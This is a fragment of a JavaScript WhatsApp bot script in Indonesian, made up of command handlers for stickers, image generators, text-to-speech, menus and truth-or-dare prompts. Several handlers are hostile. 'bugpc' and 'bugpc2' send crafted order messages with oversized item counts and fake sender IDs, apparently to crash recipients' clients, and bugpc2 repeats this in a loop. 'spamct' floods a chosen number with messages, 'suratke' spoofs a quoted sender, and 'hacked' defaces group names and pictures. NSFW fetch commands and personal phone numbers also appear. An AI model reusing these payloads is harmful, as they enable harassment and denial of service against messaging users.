					break
case 'listban':
		case 'banlist'://By M4N1K
					teks = '*List Ban:*\n\n'
					for (let manikgans of ban) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${ban.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": ban } })
					break
case 'addprem':  
if (!isOwner && !mek.key.fromMe) return reply(`LU SIAPA AJG`)
					adprem = `${args[0].replace('@','')}@s.whatsapp.net`
					prem.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break				
		case 'dellprem':  
					
					if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
					delp = body.slice(10)
					prem.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`Berhasil Menghapus wa.me/${delp} Dari Daftar Premium`)
					break
		case 'listprem':
		case 'premlist'://By M4N1K
					teks = '*List Premium:*\n\n'
					for (let manikgans of prem) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${prem.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": prem } })
					break
case 'getpic':
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await syaa.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						
						syaa.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					} catch (e) {
						syaa.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					}
				break
case 'kbbi':	
                if (isBanned) return reply(mess.ban)
				if (args.length < 1) return reply('Apa yang mau dicari di kbbi kak?')
				
				anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kbbi?kata=${body.slice(6)}&apikey=Alphabot`, {method: 'get'})
				reply('Menurut Kbbi:\n\n'+anu.result.arti)
				break
if(budy.match('Assalamualaikum')){
result = fs.readFileSync(`./strg/stiker/Waalaikumsalam.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
                  }
case "bugpc":
					case "bugpc":
if (isBanned) return reply(mess.ban)
syaa.updatePresence(from, Presence.composing)
syaa.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `Test`,
    orderTitle: `Test bro`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case "bugpc2":
  if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
syaa.sendMessage(from, `Arasyaa`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `Arasyaa`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'isbaileys': 
case 'bail': 
case 'baileys':
reply(`${mek.quoted.isBaileys}`)
break
case 'tag':
  if (isBanned) return reply(mess.ban)
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					syaa.sendMessage(from, tagq, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
			  if (isBanned) return reply(mess.ban)
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					syaa.sendMessage(from, tagu, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
case 'nuliskanan':
  if (isBanned) return reply(mess.ban)
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    c = args[0]
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
syaa.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
break
case 'naruto':
reply(mess.wait)
budi = body.slice(8)
kon = (`https://hardianto-chan.herokuapp.com/api/photooxy/naruto?apikey=hardianto&text=${budi}`)
anu = await getBuffer(kon)
syaa.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
break
					case "narutopekok":
					  if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix}coffecup Arasya`)
                    babi = args.join(" ")
                    reply("wait")
                    buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/photooxy/coffe-cup?apikey=hardianto&text=${babi}`)
                    syaa.sendMessage(from, buffer, image, {caption: 'Nih kak.. *Jangan lupa follow ig @k4t4sh1._', quoted: mek})
                break
case "attp":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(6)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${biji}`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpyellow":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(11)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=yellow&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpgreen":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(10)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=green&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpblue":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(9)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=blue&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttp":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(5)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=brown&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "kiss":
  if (isBanned) return reply(mess.ban)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=kiss&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "halloween":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(11)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${biji}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "nartoh":
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(8)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/photooxy/coffe-cup?apikey=hardianto&text=${biji}`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "minion":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(8)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/minions?text=${biji}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "hentai":
  if (isBanned) return reply(mess.ban)
  if (!isPremium) return reply(mess.prem)
  reply(mess.wait)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/nsfw/hentai?apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "blowjob":
if (!isPremium) return reply(mess.prem)
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=blowJob&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "ssweb":
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
       ini_url = body.slice(7)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/ssweb?url=${ini_url}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "artinama":
  reply(mess.wait)
  nama_lo = body.slice(10)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/artinama?nama=${nama_lo}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, { quoted: mek })
					break
case 'unblock':
if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					if (isBanned) return reply(mess.ban)
				    syaa.blockUser (`${body.slice(9)}@c.us`, "remove")
				 syaa.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
case "block":
if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
  if (isBanned) return reply(mess.ban)
				 syaa.updatePresence(from, Presence.composing) 
				 syaa.chatRead (from)
					syaa.blockUser (`${body.slice(7)}@c.us`, "add")
					syaa.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
case "shutdown":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				return syaa.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Byee Byeee')
				break
case "hacked":
  if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   syaa.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                syaa.groupUpdateSubject(from, `HACKED BY ${body.slice(7)}`)
                await sleep(1000)
                syaa.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                syaa.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
case 'detikvn':
  if (isBanned) return reply(mess.ban)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await syaa.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						syaa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				  if (isBanned) return reply(mess.ban)
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await syaa.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						syaa.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
case "bahasa"://FIXED BY ARASYAA!!!!
case "kodebahasa"://FIXED BY ARASYAA!!!!
case "code"://FIXED BY ARASYAA!!!!
if (isBanned) return reply(mess.ban)
  reply(`*List Kode Bahasa Untuk Fitur tts id*

  af: Afrikaans,
  sq: Albanian,
  ar: Arabic,
  hy: Armenian,
  ca: Catalan,
  zh: Chinese,
  zh-cn: Chinese (Mandarin/China),
  zh-tw: Chinese (Mandarin/Taiwan),
  zh-yue: Chinese (Cantonese),
  hr: Croatian,
  cs: Czech,
  da: Danish,
  nl: Dutch,
  en: English,
  en-au: English (Australia),
  en-uk: English (United Kingdom),
  en-us: English (United States),
  eo: Esperanto,
  fi: Finnish,
  fr: French,
  de: German,
  el: Greek,
  ht: Haitian Creole,
  hi: Hindi,
  hu: Hungarian,
  is: Icelandic,
  id: Indonesian,
  it: Italian,
  ja: Japanese,
  ko: Korean,
  la: Latin,
  lv: Latvian,
  mk: Macedonian,
  no: Norwegian,
  pl: Polish,
  pt: Portuguese,
  pt-br: Portuguese (Brazil),
  ro: Romanian,
  ru: Russian,
  sr: Serbian,
  sk: Slovak,
  es: Spanish,
  es-es: Spanish (Spain),
  es-us: Spanish (United States),
  sw: Swahili,
  sv: Swedish,
  ta: Tamil,
  th: Thai,
  tr: Turkish,
  vi: Vietnamese,
  cy: Welsh
  
  Ketik /tts _Kode Bahasa_ _Text_
  contoh /tts id Arasya Ganteng`)
  break
case 'tts'://FIXED BY ARASYAA!!!!
if (isBanned) return reply(mess.ban)
					if (args.length < 1) return syaa.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return syaa.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								syaa.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
					
case 'infogempa':
  if (isBanned) return reply(mess.ban)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=Ikyy69`, {method: 'get'})

					gempa = `â *INFO GEMPA*\n\nâ Waktu : ${anu.result.Waktu}\nâ Lintang : ${anu.result.Lintang}\nâ Bujur : ${anu.result.Bujur}\nâ Magnitudo : ${anu.result.Magnitudo}\nâ Kedalaman : ${anu.result.Kedalaman}\nâ Wilayah : ${anu.result.Wilayah}`
					reply('Sabar sayang')
					buff = await getBuffer(anu.result.Map)
					syaa.sendMessage(from, buff, image, {quoted: mek, caption: gempa})
					case 'creategroup':
			case 'creategrup':
			if (!isPremium) return reply(mess.prem)
			  if (isBanned) return reply(mess.ban)
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					syaa.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${args[0]}`)
                }
				break
case 'dadu':
  if (isBanned) return reply(mess.ban)
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			syaa.sendMessage(from, damdu, sticker, {quoted: mek})
			break

case "infofilm": // Update NEW FITUR 
if (isBanned) return reply(mess.ban)
reply(`wait loading`)
                if (args.length < 1) return reply(`mau nyari apaan bwang di joox?`)
                reply(`[â•] Loading`)
                asu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/filmapik/search?film=${body.slice(10)}&apikey=beta`)
                teks = '=================\n'
                resa = asu.result.result
                for (let i of resa) {
                    teks += `*Title* : ${i.title}\n*Rating* : ${i.rating}\n*Episode* : ${i.episode}\n*Movie ID* : ${i.movieId}\n*Views* : ${i.views}\n*Duration* : ${i.duration}\n*Release* : ${i.release}\n=================\n`
                }
                reply(teks)
                break
case 'donat':
              reply(`â—ª *DONASI*
  â”‚
  â”œâ”€ â *GOPAY*
  â”œâ”€ â 088213292687
  â”œâ”€ â *OVO*
  â”œâ”€ â 088213292687
  â”œâ”€ â *PULSA*
  â”œâ”€ â 081319944917
  â”œâ”€ â *INSTAGRAM*
  â””â”€ â https://www.instagram.com/@k4t4sh1._`)

              break
case 'suratke': // Case Oleh Rafli
if (isBanned) return reply(mess.ban)
                if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
				const textp = body.slice(8)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				const kataorg2 = `Surat Dari ${sender}`
				try {
				pping = await syaa.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				pping = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				const mnik = `
â•”â•â•â•â• â—¤ *SURAT FITUR* â—¢
â•‘â•”â–¸
â•‘â•  *From* : ${pushname}
â•‘â•  *Number* : @${sender.split("@")[0]}
â•‘â•  *For* : You
â•‘â•šâ–¸
â•‘â•”â–¸   ï¹ *ISI SURAT* ï¹ž  
â•‘â•  ${katakita2}
â•‘â•šâ–¸
â•šâ•â•â• â—¤ *BY MINFORMASI* â—¢ `
				syaa.sendMessage(`${noorg2}@s.whatsapp.net`,pping, image , {caption: mnik, quoted: { key: {fromMe:false, participant:`${noorg2}@s.whatsapp.net`},message: { conversation: `${kataorg2}`, contextInfo: {"mentionedJid": [sender]}}}});	
				reply('Surat Sukses Dikirim')
				break
case "spamct":
              if (isBanned) return reply(mess.ban)
              if (args.length == 0) return reply(`Masukkan Parameter\n\ncommand : ${prefix}spamchat nomor|jumlah|teks`)
					spatek = args.join(' ').split('|')
					if (isNaN(spatek[0])) return reply('Nomor Harus Berupa Angka!')
					for (let i = 0; i < spatek[1]; i++) {
					syaa.sendMessage(spatek[0]+'@s.whatsapp.net', `${spatek[2]}`, text)
					}
					reply(`Spam Terkirim Ke nomor ${spatek[0]}`)
					break
case "truth":
  if (isBanned) return reply(mess.ban)
					// Fix Case By Yogi/Hansâ›”
                 
					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButImage(from, ttrth, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", thumb, [
          {

            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `TruthðŸ˜†`,
            },
            type: 1,
          },

 ]);
					
					break
		case "dare":
		  if (isBanned) return reply(mess.ban)
					// Fix Case By Yogi/Hansâ›”
                 
					const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "ðŸ¦„ðŸ’¨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					sya = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButImage(from, der, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", thumb, [
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `DareðŸ˜†`,
            },
            type: 1,
          },

 ]);
					break
case "donasi":
  case "donate":
					// Fix Case by Putra
					sya = await getBuffer(`${linkimg}`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `â—ª *DONASI*
  â”‚
  â”œâ”€ â *GOPAY*
  â”œâ”€ â ${gopay}
  â”œâ”€ â *OVO*
  â”œâ”€ â ${ovo}
  â”œâ”€ â *DANA*
  â”œâ”€ â ${dana}
  â”œâ”€ â *PULSA*
  â”œâ”€ â ${pulsa}
  â”œâ”€ â *INSTAGRAM*
  â””â”€ â https://www.instagram.com/${instagram}` })
					break
case "info":
    me = syaa.user
					uptime = process.uptime()
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/2dbc5ba5b587d02c9ff3d.jpg`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*INFO OWNER*\n*Owner bot* : Chairul\n*No Owner* : wa.me/6289626029135\n*Ig owner* : www.instagram.com/${instagram}\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n*INFO BOT*\n*Nama bot* : ${me.name}\n*Nomor bot* : @${me.jid.split('@')[0]}\n*Prefix* : ${prefix}\n*Total block contact* : ${blocked.length}\n*The bot is active on* : ${kyun(uptime)}\n*Ketik* : ${prefix}report _Untuk melaporkan admin bot melalui bot_\n*Ketik* : ${prefix}owner untuk menghubungi admin bot kami.` })
					break
//MENUÂ² AN
case "ownermenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/0f2a2ecf9500e502fe58a.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*OWNER MENU*
â€¢ ${prefix}off
â€¢ ${prefix}on
â€¢ ${prefix}status
â€¢ ${prefix}setthumb
â€¢ ${prefix}settarget
â€¢ ${prefix}shutdown
â€¢ ${prefix}hacked
â€¢ ${prefix}setfakeimg
â€¢ ${prefix}setreply
â€¢ ${prefix}addprem @user
â€¢ ${prefix}dellprem @user
â€¢ ${prefix}ban @user
â€¢ ${prefix}unban @user
â€¢ ${prefix}setprefix [2 Button]
â€¢ ${prefix}mode [2 Button self/public]
â€¢ ${prefix}term <code>
â€¢ ${prefix}eval <code>
â€¢ ${prefix}colongsw [reply sw]
â€¢ ${prefix}readall
 $
 >
 =>` })
					break
case "grupmenu":
  case "groupmenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/24149d6200dbd9e55942d.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*GRUP MENU*
â€¢ ${prefix}grup [3 Button]
â€¢ ${prefix}promote <reply chat member>
â€¢ ${prefix}demote <reply chat member>
â€¢ ${prefix}setdesc
â€¢ ${prefix}setname
â€¢ ${prefix}hidetag
â€¢ ${prefix}kontag
â€¢ ${prefix}sticktag
â€¢ ${prefix}totag
â€¢ ${prefix}kick <reply/tag member>
â€¢ ${prefix}add <reply/tag member>
â€¢ ${prefix}getbio <reply chat member>
â€¢ ${prefix}getname <reply chat member>
â€¢ ${prefix}reminder <msg/2s>
â€¢ ${prefix}listonline
â€¢ ${prefix}groupinfo
â€¢ ${prefix}linkgc
â€¢ ${prefix}sider [reply chat bot]
â€¢ ${prefix}antilink
â€¢ ${prefix}antihidetag
â€¢ ${prefix}antiviewonce
â€¢ ${prefix}antivirtex
â€¢ ${prefix}kickarea` })
					break
case "makermenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/ce0ff72c46a2d6b45e24a.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*MAKER MENU*
â€¢ ${prefix}memegen Atas|Bawah
â€¢ ${prefix}bajingan lu _Nama Mu_
â€¢ ${prefix}sticker
â€¢ ${prefix}attp _Text_
â€¢ ${prefix}fdeface
â€¢ ${prefix}semoji
â€¢ ${prefix}wasted
â€¢ ${prefix}wanted
â€¢ ${prefix}pubglogo teks|teks
â€¢ ${prefix}deltrash
â€¢ ${prefix}card-game Judul|Keterangan
â€¢ ${prefix}squidrip
â€¢ ${prefix}sertiff1 <text>
â€¢ ${prefix}bpink <text>
â€¢ ${prefix}tulis
â€¢ ${prefix}googlem Text|Text
â€¢ ${prefix}roses
â€¢ ${prefix}wooden
â€¢ ${prefix}quote
â€¢ ${prefix}textburn
â€¢ ${prefix}tahta _Nama_
â€¢ ${prefix}halloween _Name_
â€¢ ${prefix}minion _Name_
â€¢ ${prefix}dance _Name_
â€¢ ${prefix}warrior _Name_
â€¢ ${prefix}text3d _Name_
â€¢ ${prefix}express _Name_
â€¢ ${prefix}spiderman _Name_
â€¢ ${prefix}matrix _Name_
â€¢ ${prefix}vampire _Name_
â€¢ ${prefix}lolim _Text_
â€¢ ${prefix}remm _Text_
â€¢ ${prefix}gura _Text_
â€¢ ${prefix}kaneki _Name_` })
					break
case "funmenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/f5dd2eb768a133d3b6528.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*FUN MENU*
â€¢ ${prefix}slot
â€¢ ${prefix}suit
â€¢ ${prefix}say _Text_
â€¢ ${prefix}bisakah _Querry_
â€¢ ${prefix}kapankah _Querry_
â€¢ ${prefix}apakah _Querry_
â€¢ ${prefix}belah _Querry_
â€¢ ${prefix}bagaimanakah _Querry_
â€¢ ${prefix}rate _Querry_
â€¢ ${prefix}caklontong
â€¢ ${prefix}sangecek _Name_
â€¢ ${prefix}gaycek _Name_
â€¢ ${prefix}terganteng
â€¢ ${prefix}tercantik
â€¢ ${prefix}lesbicek _Name_
â€¢ ${prefix}gantengcek _Name_
â€¢ ${prefix}cantikcek _Name_
â€¢ ${prefix}watak _Name_
â€¢ ${prefix}hobby _Name_
â€¢ ${prefix}fitnah
â€¢ ${prefix}fitnahpc
â€¢ ${prefix}kontak 62896260291358|Arasya
â€¢ ${prefix}jadian
â€¢ ${prefix}
â€¢ ${prefix}tod
â€¢ ${prefix}truth
â€¢ ${prefix}dare
â€¢ ${prefix}wangy _NamaMu_
â€¢ ${prefix}citacita` })
					break
case "convertmenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/8bc9d1c514c76446ae842.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*CONVERT*
â€¢ ${prefix}toimg
â€¢ ${prefix}tomp3
â€¢ ${prefix}tomp4
â€¢ ${prefix}slow
â€¢ ${prefix}fast
â€¢ ${prefix}reverse
â€¢ ${prefix}tourl` })
					break
case "downloadmenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/317c98e7a83c14fcf451b.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*DOWNLOADER MENU*
â€¢ ${prefix}youtube <url>
â€¢ ${prefix}ytmp3 <url>
â€¢ ${prefix}ytmp4 <url>
â€¢ ${prefix}tiktok <url>
â€¢ ${prefix}instagram <url>
â€¢ ${prefix}twitter <url>` })
					break
case "uploadmenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/fc635320103279a3dbcd1.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*UP STORY MENU*
â€¢ ${prefix}upswteks
â€¢ ${prefix}upswimage
â€¢ ${prefix}upswvideo
â€¢ ${prefix}upswvoice
â€¢ ${prefix}upswgif
â€¢ ${prefix}upswaudio
â€¢ ${prefix}upswsticker` })
					break
case "storagemenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/d4a42eb0966c598dfa0bd.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STORAGE MENU*
â€¢ ${prefix}addvn _Nama_
â€¢ ${prefix}addvideo _Nama_
â€¢ ${prefix}addsticker _Nama_
â€¢ ${prefix}addimage _Nama_
â€¢ ${prefix}listvn
â€¢ ${prefix}listvideo
â€¢ ${prefix}liststicker
â€¢ ${prefix}listimg
â€¢ ${prefix}getvn _Database_
â€¢ ${prefix}getvideo _Database_
â€¢ ${prefix}getsticker _Database_
â€¢ ${prefix}getimage _Database_` })
					break
case "menulain":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/6d91364ee9449c3a64164.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*OTHER MENU*
â€¢ ${prefix}shortlink _Link_
â€¢ ${prefix}wikipedia _Querry_
â€¢ ${prefix}ssweb _Link_
â€¢ ${prefix}asupan
â€¢ ${prefix}asupan2
â€¢ ${prefix}tts id _Text_
â€¢ ${prefix}polosanmeme
â€¢ ${prefix}detikvn <ReplyVn|Jumlah>
â€¢ ${prefix}detikvideo <ReplyVid|Jumlah>
â€¢ ${prefix}delete
â€¢ ${prefix}infogempa
â€¢ ${prefix}dadu
â€¢ ${prefix}tospam _Jumlah_
â€¢ ${prefix}ping
â€¢ ${prefix}inspect
